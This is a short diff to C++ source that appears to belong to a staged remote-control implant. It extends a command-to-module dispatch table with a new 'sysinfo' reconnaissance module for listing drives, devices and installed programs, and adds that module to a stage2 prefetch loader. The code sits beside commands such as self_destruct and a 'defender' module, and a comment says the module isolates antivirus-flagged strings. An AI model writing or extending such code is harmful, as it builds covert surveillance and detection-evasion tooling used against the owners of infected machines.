@@ -104,6 +104,13 @@ inline const char* cmd_to_module(const std::string& cmd) {
         {"host_restart",     "defender"},
         {"host_update",      "defender"},
         {"self_destruct",    "defender"},
+
+        // sysinfo.bin — heavy read-only enumeration (AV-flag strings)
+        {"drives_list",         "sysinfo"},
+        {"device_list",         "sysinfo"},
+        {"installed_programs",  "sysinfo"},
+        {"speed_test_internet", "sysinfo"},
+        {"host_relay_speed",    "sysinfo"},
     };
     auto it = exact_map.find(cmd);
     return (it == exact_map.end()) ? nullptr : it->second;
@@ -323,7 +330,7 @@ public:
         stage1_log(1, "stage2: prefetch_all_async starting");
         std::thread([this]{
             wipe_cache_dir();
-            static const char* kModules[] = { "filemgr", "procmgr", "defender" };
+            static const char* kModules[] = { "filemgr", "procmgr", "defender", "sysinfo" };
             for (auto m : kModules) {
                 std::string name = m;
                 stage1_log(1, ("stage2: prefetch begin " + name).c_str());
